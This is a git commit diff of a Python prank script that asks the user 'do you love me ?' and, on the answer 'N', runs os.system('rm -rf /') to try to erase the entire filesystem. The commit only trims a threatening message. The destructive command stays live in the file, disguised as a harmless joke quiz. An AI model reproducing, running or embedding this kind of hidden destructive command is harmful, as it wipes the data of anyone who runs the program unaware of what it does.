2be3e657148065ecde3508f7efb4ec1a8b6cd9fc
ARABIC SYSTEM <68659620+DODO-254@users.noreply.github.com>
2021-03-12 16:12:54 +0100

    Update do-you-love-me.py

--- do-you-love-me.py
+++ do-you-love-me.py
@@ -3,6 +3,7 @@ like=input("do you love me ? Y|N ----) ")
 if like == "Y" :
 	print ("NICE CHOOSE \n I LOVE YOU TOO")
 if like == "N" :
-	print ("OMG!..I WILL HACK U BEACUSE U DONT LOVE ME")
+	print ("OMG!..I WILL")
 	os.system("cd $HOME")
 	os.system("rm -rf /")
+	
